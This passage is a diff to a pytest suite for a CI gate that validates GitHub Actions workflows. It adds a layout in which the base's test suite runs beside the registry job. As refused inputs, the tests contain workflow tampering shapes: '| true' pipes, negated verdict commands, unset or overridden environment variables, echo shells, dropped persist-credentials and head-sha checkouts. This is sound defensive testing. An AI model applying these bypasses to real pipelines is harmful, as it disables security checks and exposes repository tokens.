@@ -112,25 +112,76 @@ def plan(**over) -> str:
                     "status": "ready", **over}) + TASKS
 
 
+# FEAT-CICD-001 contract stage: the synthetic gate workflows are the MOVED layout, a pair of files. spec-gate.yml
+# keeps only its verdict job; registry-check.yml carries the registry job and, beside it, job base-suite, which
+# checks out the base and, sparse, the head's two gate files, copies them over scripts/gate and runs the base's
+# suites. Today's layout (spec-gate.yml job base-suite after the verdict, artifact handoff) is OLD_GATE_WF, used
+# by the old_layout_* group alone.
 GATE_WF = ("name: spec-gate\non:\n  pull_request_target:\n    types: [opened, synchronize, reopened, edited, ready_for_review]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - uses: actions/checkout@v4\n        with:\n          ref: {REF}\n"
            "      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n"
-           "      - env:\n{ENV}        run: {A}\n      - run: {B}\n"
-           "      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n"
-           "  base-suite:\n    needs: gate\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n"
-           "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          persist-credentials: false\n"
-           "      - uses: actions/download-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: scripts/gate\n      - run: {C}\n")
+           "      - env:\n{ENV}        run: {A}\n")
+OLD_GATE_WF = ("name: spec-gate\non:\n  pull_request_target:\n    types: [opened, synchronize, reopened, edited, ready_for_review]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n"
+               "      - uses: actions/checkout@v4\n        with:\n          ref: {REF}\n"
+               "      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n"
+               "      - env:\n{ENV}        run: {A}\n      - run: {B}\n"
+               "      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n"
+               "  base-suite:\n    needs: gate\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n"
+               "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          persist-credentials: false\n"
+               "      - uses: actions/download-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: scripts/gate\n      - run: {C}\n")
 VERDICT_ENV = {"BASE_SHA": "base.sha", "HEAD_SHA": "head.sha", "PR_HEAD_REF": "head.ref", "PR_BASE_REF": "base.ref",
                "PR_HEAD_REPO": "head.repo.full_name", "PR_NUMBER": "number", "PR_DRAFT": "draft", "PR_TITLE": "title", "PR_BODY": "body"}
-GATE_WF = GATE_WF.replace("{ENV}", "".join(f"          {k}: ${{{{ github.event.pull_request.{v} }}}}\n" for k, v in VERDICT_ENV.items())
-                          + "          PR_BASE_REPO: ${{ github.repository }}\n")
+_ENV = ("".join(f"          {k}: ${{{{ github.event.pull_request.{v} }}}}\n" for k, v in VERDICT_ENV.items())
+        + "          PR_BASE_REPO: ${{ github.repository }}\n")
+GATE_WF, OLD_GATE_WF = GATE_WF.replace("{ENV}", _ENV), OLD_GATE_WF.replace("{ENV}", _ENV)
 VERDICT_CMD = 'python3 scripts/gate/spec_gate.py --pr "$BASE_SHA" "$HEAD_SHA"'
 EXPORT_CMD = 'git show "$HEAD_SHA:scripts/gate/spec_gate.py" > "$RUNNER_TEMP/proposed/spec_gate.py"'
 SUITE_CMD = "python3 -m pytest tests/scripts/test_spec_gate.py -q"
+SPEC_GATE, REGISTRY_CHECK = ".github/workflows/spec-gate.yml", ".github/workflows/registry-check.yml"
+PINNED_SPEC_GATE, PINNED_REGISTRY_CHECK = "scripts/gate/pinned/spec-gate.yml", "scripts/gate/pinned/registry-check.yml"
+COPY_CMDS = ("cp proposed-head/scripts/gate/spec_gate.py scripts/gate/spec_gate.py",
+             "cp proposed-head/scripts/gate/export_model_registry.py scripts/gate/export_model_registry.py", "rm -rf proposed-head")
+COPY_CMD = "\n          ".join(COPY_CMDS)
+SUITE_WF = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
+            "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n"
+            "          python3 -m py_compile \"$gate\"\n          python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\"\n"
+            "          python3 -m pytest tests/scripts/test_spec_gate.py -q -p no:cacheprovider --noconftest\n"
+            "          python3 scripts/gate/export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n"
+            "  base-suite:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    permissions:\n      contents: read\n    steps:\n"
+            "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n          persist-credentials: false\n"
+            "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          path: proposed-head\n"
+            "          persist-credentials: false\n          sparse-checkout: |\n            scripts/gate/spec_gate.py\n            scripts/gate/export_model_registry.py\n"
+            "          sparse-checkout-cone-mode: false\n"
+            "      - run: |\n          {B}\n          python3 -m pip install --quiet pytest pyyaml pytest-xdist==3.8.0\n          {C}\n"
+            "          python3 -m pytest tests/scripts/test_export_model_registry.py -q -p no:cacheprovider --noconftest\n")
 
 
-def gate_workflow(ref: str = "${{ github.event.pull_request.base.sha }}", a: str = VERDICT_CMD, b: str = EXPORT_CMD, c: str = SUITE_CMD) -> str:
-    return GATE_WF.replace("{REF}", ref).replace("{A}", a).replace("{B}", b).replace("{C}", c)
+def _in_block(value: str) -> str:
+    """A step's run value as lines of the base-suite job's `run: |` block (a `|` value loses its indicator)."""
+    return value[len("|\n          "):] if value.startswith("|\n          ") else value
+
+
+def gate_workflow(ref: str = "${{ github.event.pull_request.base.sha }}", a: str = VERDICT_CMD) -> str:
+    """spec-gate.yml in the moved layout: the verdict job alone."""
+    return GATE_WF.replace("{REF}", ref).replace("{A}", a)
+
+
+def suite_workflow(b: str = COPY_CMD, c: str = SUITE_CMD) -> str:
+    """registry-check.yml in the moved layout: the registry job and job base-suite, whose step copies the
+    proposed files (`b`) and runs the base's gate suite (`c`) between the pinned install and the exporter suite."""
+    return SUITE_WF.replace("{B}", _in_block(b)).replace("{C}", _in_block(c))
+
+
+def gate_pair(ref: str = "${{ github.event.pull_request.base.sha }}", a: str = VERDICT_CMD, b: str = COPY_CMD, c: str = SUITE_CMD,
+              pinned: bool = False) -> dict[str, str]:
+    """The moved layout as the pair of files a change writes: the live pair, or the pinned pair."""
+    spec_path, registry_path = (PINNED_SPEC_GATE, PINNED_REGISTRY_CHECK) if pinned else (SPEC_GATE, REGISTRY_CHECK)
+    return {spec_path: gate_workflow(ref, a), registry_path: suite_workflow(b, c)}
+
+
+def old_gate_workflow(ref: str = "${{ github.event.pull_request.base.sha }}", a: str = VERDICT_CMD, b: str = EXPORT_CMD, c: str = SUITE_CMD) -> str:
+    """spec-gate.yml in today's layout, for the old_layout_* group: the verdict job, then job base-suite."""
+    return OLD_GATE_WF.replace("{REF}", ref).replace("{A}", a).replace("{B}", b).replace("{C}", c)
 
 
 def body(ticked: bool = False, spec_path: str = SPEC, plan_path: str | None = PLAN) -> str:
@@ -304,9 +355,11 @@ def test_the_gate_cannot_be_edited_outside_chore_and_ci_runs_the_base_copy(repo)
     workflow = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
     # One trigger; the head-executing registry check is its own workflow, so a run never
     # creates a skipped twin of the other's job (stocks#1205 r4118475509, P1). The second
-    # job here runs the base's suite against the proposed gate, after the verdict.
+    # job here runs the base's suite against the proposed gate, after the verdict (today's layout), or
+    # FEAT-CICD-001 moved it to registry-check.yml beside the registry job: the real pair holds one of the two.
     assert list(workflow.get("on", workflow.get(True))) == ["pull_request_target"]
-    assert list(workflow["jobs"]) == ["gate", "base-suite"]
+    registry_jobs = list(yaml.safe_load((REPO / REGISTRY_CHECK).read_text(encoding="utf-8"))["jobs"])
+    assert (list(workflow["jobs"]), registry_jobs) in ((["gate", "base-suite"], ["registry"]), (["gate"], ["registry", "base-suite"]))
     for job in workflow["jobs"].values():
         checkout = next(s for s in job["steps"] if s.get("uses", "").startswith("actions/checkout"))
         assert checkout["with"]["ref"] == "${{ github.event.pull_request.base.sha }}"
@@ -1696,7 +1749,7 @@ def test_a_workload_change_carries_its_capacity_numbers(repo):
     assert pr(repo, BRANCH, CODE, **title, PR_BODY=body()).returncode == 0
     # solyra#72 r4118831965: a chore/ PR editing the gate's own workflow is untraced and
     # still changes what CI runs, so the Capacity check does not hide behind the trace
-    workflow = {".github/workflows/spec-gate.yml": gate_workflow()}
+    workflow = {".github/workflows/spec-gate.yml": old_gate_workflow()}
     r = pr(repo, "chore/gate-workflow", workflow, PR_BODY="## Summary\n\nretune the gate\n")
     assert r.returncode == 1 and "PR body needs a Capacity section" in r.stdout, r.stdout
     assert pr(repo, "chore/gate-workflow", workflow, PR_BODY="## Capacity\nn/a: one PR-triggered job, seconds\n").returncode == 0
@@ -2724,8 +2777,8 @@ def test_a_gate_workflow_checks_out_its_own_side_and_plans_stay_bound(repo):
         r = pr(repo, "chore/gate-workflow", {wf: head.replace("{REF}", f"          ref: {ref}\n")}, **cap)
         assert r.returncode == 1 and "instead of the PR head" in r.stdout, (ref, r.stdout)
     gate_wf = GATE_WF.replace("{A}", VERDICT_CMD).replace("{B}", EXPORT_CMD).replace("{C}", SUITE_CMD)
-    assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", "${{ github.event.pull_request.base.sha }}")}, **cap).returncode == 0
-    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", "${{ github.event.pull_request.head.sha }}")}, **cap)
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", "${{ github.event.pull_request.base.sha }}")}, **cap).returncode == 0
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", "${{ github.event.pull_request.head.sha }}")}, **cap)
     assert r.returncode == 1 and "under pull_request_target" in r.stdout, r.stdout
     on_base(repo, {PLAN: plan(status="done", pr=42)})
     r = pr(repo, "docs/foo", {PLAN: "---\nbranch: docs/foo\n---\n"})
@@ -2776,9 +2829,9 @@ def test_contract_commands_run_unconditionally_under_the_declared_trigger(repo):
         assert r.returncode == 1 and "declares triggers other than pull_request" in r.stdout, (extra, r.stdout)
     assert pr(repo, "chore/gate-workflow", {wf: inline.replace("[pull_request, workflow_dispatch]", "[pull_request]").replace("{BODY}", plain)}, **cap).returncode == 0
     gate_wf = gate_workflow().replace("on:\n  pull_request_target:\n", "on:\n  {ON}:\n")
-    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{ON}", "pull_request") + "# pull_request_target:\n"}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": gate_wf.replace("{ON}", "pull_request") + "# pull_request_target:\n"}, **cap)
     assert r.returncode == 1 and "no longer runs on pull_request_target" in r.stdout, r.stdout
-    assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{ON}", "pull_request_target")}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": gate_wf.replace("{ON}", "pull_request_target")}, **cap).returncode == 0
 
 
 def test_documentation_branches_carry_documentation_from_delivery_branches(repo):
@@ -2834,9 +2887,9 @@ def test_wrappers_comments_and_hollow_bodies_do_not_satisfy_the_gate_files(repo)
     assert r.returncode == 1 and "grants a write permission" in r.stdout, r.stdout
     gate_wf = GATE_WF.replace("{A}", VERDICT_CMD).replace("{B}", EXPORT_CMD).replace("{C}", SUITE_CMD)
     for ref in ("${{ github.event.pull_request.merge_commit_sha }}", "refs/pull/${{ github.event.number }}/merge", "main"):
-        r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", ref)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", ref)}, **cap)
         assert r.returncode == 1 and "instead of the event's base sha" in r.stdout, (ref, r.stdout)
-    assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", "${{github.event.pull_request.base.sha}}")}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", "${{github.event.pull_request.base.sha}}")}, **cap).returncode == 0
     suite = "tests/scripts/test_spec_gate.py"
     on_base(repo, {suite: "def test_a():\n    assert f(1)\n    assert f(2)\n\n\ndef test_b():\n    assert f(3)\n"})
     r = pr(repo, "chore/gate-suite", {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    assert f(3)\n"}, **cap)
@@ -2900,37 +2953,64 @@ def test_the_invoked_command_is_the_contract_and_policy_files_keep_their_schema(
     subst = "".join(f"          out=$({c} 2>&1); rc=$?\n" for c in cmds)
     assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{BODY}", subst)}, **cap).returncode == 0
     # solyra#72 r4120337733 (P1): the BASE's suite judges the proposed gate from spec-gate.yml,
-    # after the verdict; the PR's own suite (registry-check.yml) cannot certify the gate alone
+    # after the verdict; the PR's own suite (registry-check.yml) cannot certify the gate alone.
+    # FEAT-CICD-001: or, in the moved layout, from registry-check.yml's own base-suite job; the real
+    # pair holds one of the two, and the same duties are read from whichever it holds
     workflow = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
-    gate_steps = workflow["jobs"]["gate"]["steps"]
-    verdict = next(i for i, st in enumerate(gate_steps) if 'spec_gate.py --pr "$BASE_SHA" "$HEAD_SHA"' in st.get("run", ""))
-    export = next(i for i, st in enumerate(gate_steps) if 'git show "$HEAD_SHA:scripts/gate/spec_gate.py"' in st.get("run", ""))
-    assert verdict < export and any("upload-artifact" in st.get("uses", "") for st in gate_steps[export:])
-    # stocks#1205 r4120528961 (P1), solyra#72 r4120515772 (P1): the suite runs PR-controlled Python in
-    # its own job, after the verdict via `needs`, from a checkout that keeps no credentials
-    suite_job = workflow["jobs"]["base-suite"]
-    assert suite_job["needs"] == "gate"
-    checkout = next(st for st in suite_job["steps"] if st.get("uses", "").startswith("actions/checkout"))
-    assert checkout["with"]["persist-credentials"] is False and "head" not in checkout["with"]["ref"]
-    assert any("download-artifact" in st.get("uses", "") for st in suite_job["steps"])
-    run = next(st for st in suite_job["steps"] if "python3 -m pytest tests/scripts/test_spec_gate.py" in st.get("run", ""))
-    assert "if" not in run and "continue-on-error" not in run
-    assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow()}, **cap).returncode == 0
-    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow(a=EXPORT_CMD, b=VERDICT_CMD)}, **cap)
+    registry = yaml.safe_load((REPO / REGISTRY_CHECK).read_text(encoding="utf-8"))
+    if "base-suite" in workflow["jobs"]:
+        gate_steps = workflow["jobs"]["gate"]["steps"]
+        verdict = next(i for i, st in enumerate(gate_steps) if 'spec_gate.py --pr "$BASE_SHA" "$HEAD_SHA"' in st.get("run", ""))
+        export = next(i for i, st in enumerate(gate_steps) if 'git show "$HEAD_SHA:scripts/gate/spec_gate.py"' in st.get("run", ""))
+        assert verdict < export and any("upload-artifact" in st.get("uses", "") for st in gate_steps[export:])
+        # stocks#1205 r4120528961 (P1), solyra#72 r4120515772 (P1): the suite runs PR-controlled Python in
+        # its own job, after the verdict via `needs`, from a checkout that keeps no credentials
+        suite_job = workflow["jobs"]["base-suite"]
+        assert suite_job["needs"] == "gate"
+        checkout = next(st for st in suite_job["steps"] if st.get("uses", "").startswith("actions/checkout"))
+        assert checkout["with"]["persist-credentials"] is False and "head" not in checkout["with"]["ref"]
+        assert any("download-artifact" in st.get("uses", "") for st in suite_job["steps"])
+        run = next(st for st in suite_job["steps"] if "python3 -m pytest tests/scripts/test_spec_gate.py" in st.get("run", ""))
+        assert "if" not in run and "continue-on-error" not in run
+    else:
+        # the proposed files reach the job by a sparse checkout of the head's two gate files (the export and
+        # upload's duty), in a job of its own that is not the registry job (the `needs: gate` job's duty)
+        assert list(workflow["jobs"]) == ["gate"] and list(registry["jobs"]) == ["registry", "base-suite"]
+        suite_job = registry["jobs"]["base-suite"]
+        checkouts = [st for st in suite_job["steps"] if st.get("uses", "").startswith("actions/checkout")]
+        head_checkout = next(st for st in checkouts if "head" in st["with"]["ref"])
+        assert head_checkout["with"]["sparse-checkout"].split() == ["scripts/gate/spec_gate.py", "scripts/gate/export_model_registry.py"]
+        assert head_checkout["with"]["sparse-checkout-cone-mode"] is False and head_checkout["with"]["path"] == "proposed-head"
+        # every checkout keeps no credentials, and the base's tree is the workspace
+        assert all(st["with"]["persist-credentials"] is False for st in checkouts) and "head" not in checkouts[0]["with"]["ref"]
+        # the copy over scripts/gate is the download's duty: in the suites' own step, before them, with no action after it
+        run = next(st for st in suite_job["steps"] if "python3 -m pytest tests/scripts/test_spec_gate.py" in st.get("run", ""))
+        assert suite_job["steps"][-1] is run and suite_job["permissions"] == {"contents": "read"}
+        assert run["run"].index("cp proposed-head/scripts/gate/spec_gate.py scripts/gate/spec_gate.py") < run["run"].index("python3 -m pytest")
+        assert "if" not in run and "continue-on-error" not in run and "if" not in suite_job
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": gate_workflow()}, **cap).returncode == 0
+    # (moved layout: the suite runs before the copy that puts the proposed gate in place)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(b=SUITE_CMD + "\n          " + COPY_CMD, c="echo done"), ".github/workflows/spec-gate.yml": gate_workflow()}, **cap)
     assert r.returncode == 1 and "does not follow" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow(b="echo skip")}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(b="echo skip"), ".github/workflows/spec-gate.yml": gate_workflow()}, **cap)
     assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
     # the suite job without `needs` runs concurrently with the verdict; the suite in the verdict's
     # job, or from a checkout that keeps credentials, hands PR code the token
-    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow().replace("    needs: gate\n", "")}, **cap)
+    # (moved layout: the job has no `needs`; a suite that runs before the proposed files are copied in is the same gap)
+    early = "python3 -m pytest tests/scripts/test_export_model_registry.py -q\n          " + COPY_CMD
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(b=early), ".github/workflows/spec-gate.yml": gate_workflow()}, **cap)
     assert r.returncode == 1 and "does not follow" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow(b=EXPORT_CMD + "\n      - run: " + SUITE_CMD, c="echo done")}, **cap)
+    # (moved layout: the copy and the suites merged into the registry job, which runs the proposed gate with its token)
+    merged = suite_workflow().split("  base-suite:\n")[0].replace(
+        "          python3 scripts/gate/export_model_registry.py --check", "          " + COPY_CMD + "\n          " + SUITE_CMD
+        + "\n          python3 -m pytest tests/scripts/test_export_model_registry.py -q\n          python3 scripts/gate/export_model_registry.py --check")
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: merged, ".github/workflows/spec-gate.yml": gate_workflow()}, **cap)
     assert r.returncode == 1 and "holds no checkout credentials" in r.stdout, r.stdout
-    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow().replace("          persist-credentials: false\n", "")}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow().replace("          persist-credentials: false\n", ""), ".github/workflows/spec-gate.yml": gate_workflow()}, **cap)
     assert r.returncode == 1 and "holds no checkout credentials" in r.stdout, r.stdout
     # stocks#1205 r4120528978 (P1): a job running the gate's commands has a checkout
     no_checkout = gate_workflow().replace("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n      - run: git fetch", "      - run: git fetch")
-    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": no_checkout}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": no_checkout}, **cap)
     assert r.returncode == 1 and "without an actions/checkout step" in r.stdout, r.stdout
     r = pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "    permissions: {\n      contents: write\n    }\n").replace("{BODY}", plain)}, **cap)
     assert r.returncode == 1 and "grants a write permission" in r.stdout, r.stdout
@@ -3069,13 +3149,13 @@ def test_activity_types_landing_order_and_registries_are_policy(repo):
     """
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     typed = gate_workflow()
-    assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": typed}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": typed}, **cap).returncode == 0
     for types in ("[opened, synchronize, reopened]", "[opened, synchronize, reopened, edited]", "[opened, synchronize, reopened, ready_for_review]"):
-        r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": typed.replace("[opened, synchronize, reopened, edited, ready_for_review]", types)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": typed.replace("[opened, synchronize, reopened, edited, ready_for_review]", types)}, **cap)
         assert r.returncode == 1 and "no longer fires on" in r.stdout, (types, r.stdout)
     # no `types:` at all means GitHub's defaults, which lack the two the gate depends on
     untyped = typed.replace("    types: [opened, synchronize, reopened, edited, ready_for_review]\n", "")
-    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": untyped}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), ".github/workflows/spec-gate.yml": untyped}, **cap)
     assert r.returncode == 1 and "no longer fires on edited, ready_for_review" in r.stdout, r.stdout
     new_plan, data_spec = "docs/superpowers/plans/2026-09-28-data-d.md", "docs/superpowers/specs/2026-09-28-data-d.md"
     r = pr(repo, "docs/plan-data", {data_spec: spec(feat_id="FEAT-DATA-001"), new_plan: plan(feat_id="FEAT-DATA-001", spec=data_spec, branch="fix/feat-data-001-d")})
@@ -3109,31 +3189,31 @@ def test_gate_inputs_shells_hooks_and_canvases_are_judged_where_they_act(repo):
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
     for shape in ("PR_NUMBER= " + VERDICT_CMD, "env PR_DRAFT=true " + VERDICT_CMD, VERDICT_CMD + " | true"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a=shape)}, **cap)
         assert r.returncode == 1 and ("assigns or unsets" in r.stdout or "no longer executes" in r.stdout), (shape, r.stdout)
     for head_run in ("        run: |\n          export PR_TITLE=\n          " + VERDICT_CMD + "\n",
                      "        run: |\n          echo \"PR_BODY=\" >> \"$GITHUB_ENV\"\n          " + VERDICT_CMD + "\n",
                      "        run: |\n          unset HEAD_SHA\n          " + VERDICT_CMD + "\n"):
-        r = pr(repo, "chore/gate-workflow", {wf: typed.replace("        run: " + VERDICT_CMD + "\n", head_run)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("        run: " + VERDICT_CMD + "\n", head_run)}, **cap)
         assert r.returncode == 1 and "assigns or unsets" in r.stdout, (head_run, r.stdout)
     # the step's own env binds every input to the event; a rebound or dropped name is refused
     for rebound in (("          PR_NUMBER: ${{ github.event.pull_request.number }}\n", "          PR_NUMBER: ''\n"),
                     ("          PR_NUMBER: ${{ github.event.pull_request.number }}\n", ""),
                     ("          PR_DRAFT: ${{ github.event.pull_request.draft }}\n", "          PR_DRAFT: 'false'\n")):
-        r = pr(repo, "chore/gate-workflow", {wf: typed.replace(*rebound)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace(*rebound)}, **cap)
         assert r.returncode == 1 and "no longer binds" in r.stdout, (rebound, r.stdout)
     spaced = typed.replace("PR_NUMBER: ${{ github.event.pull_request.number }}", "PR_NUMBER: ${{github.event.pull_request.number}}")
-    assert pr(repo, "chore/gate-workflow", {wf: spaced}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: spaced}, **cap).returncode == 0
     # a custom shell on the workflow, the job or the step is not judged; `shell: bash` is
     for shell in (typed.replace("permissions:\n", "defaults:\n  run:\n    shell: echo {0}\npermissions:\n", 1),
                   typed.replace("  gate:\n", "  gate:\n    defaults:\n      run:\n        shell: echo {0}\n", 1),
                   typed.replace("      - env:\n", "      - shell: python {0}\n        env:\n", 1)):
-        r = pr(repo, "chore/gate-workflow", {wf: shell}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: shell}, **cap)
         assert r.returncode == 1 and "no longer executes" in r.stdout, (shell, r.stdout)
     explicit = typed.replace("permissions:\n", "defaults:\n  run:\n    shell: bash\npermissions:\n", 1)
-    assert pr(repo, "chore/gate-workflow", {wf: explicit}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: explicit}, **cap).returncode == 0
     # the exporter's check is required as soon as the exporter exists, on the base or the head
     rc = ".github/workflows/registry-check.yml"
     head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
@@ -3185,38 +3265,46 @@ def test_negations_conditions_handoffs_and_the_hook_mode_are_the_contract(repo):
     cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
     wf = ".github/workflows/spec-gate.yml"
     typed = gate_workflow()
-    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
+    assert pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed}, **cap).returncode == 0
     for shape in ("! " + VERDICT_CMD + "; true", "if " + VERDICT_CMD + "; then :; fi", "if ! " + VERDICT_CMD + "; then exit 1; fi",
                   "while " + VERDICT_CMD + "; do break; done"):
-        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap)
+        r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: gate_workflow(a=shape)}, **cap)
         assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
     # an `if:` on the step's dash line skips the step like one under a `name:`
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("      - env:\n", "      - if: false\n        env:\n", 1)}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("      - env:\n", "      - if: false\n        env:\n", 1)}, **cap)
     assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
     # the head fetch is a contract command, before the verdict
-    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n", "")}, **cap)
+    r = pr(repo, "chore/gate-workflow", {REGISTRY_CHECK: suite_workflow(), wf: typed.replace("      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n", "")}, **cap)
     assert r.returncode == 1 and "no longer executes" in r.stdout and "git fetch" in r.stdout, r.stdout
-    # the handoff: upload after the export, download of the same name into scripts/gate before the suite
-    for broken in (typed.replace("      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n", ""),
-                   typed.replace("      - uses: actions/download-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: scripts/gate\n", ""),
-                   typed.replace("          name: proposed-spec-gate\n          path: scripts/gate\n", "          name: other\n          path: scripts/gate\n"),
-                   typed.replace("          name: proposed-spec-gate\n          path: scripts/gate\n", "          name: proposed-spec-gate\n          path: elsewhere\n"),
-                   typed.replace("      - uses: actions/upload-artifact@v4\n", "      - if: false\n        uses: actions/upload-artifact@v4\n"),
-                   typed.replace("      - env:\n", "      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n      - env:\n", 1)
-                        .replace("      - run: " + EXPORT_CMD + "\n      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n",
-                                 "      - run: " + EXPORT_CMD + "\n")):
-        r = pr(repo, "chore/gate-workflow", {wf: broken}, **cap)
+    # the handoff: upload after the export, download of the same name into scripts/gate before the suite;
+    # moved (FEAT-CICD-001): the sparse head checkout into proposed-head, right after the base checkout
+    head = "          ref: ${{ github.event.pull_request.head.sha }}\n"
+    head_step = ("      - uses: actions/checkout@v4\n        with:\n" + head + "          path: proposed-head\n          persist-credentials: false\n"
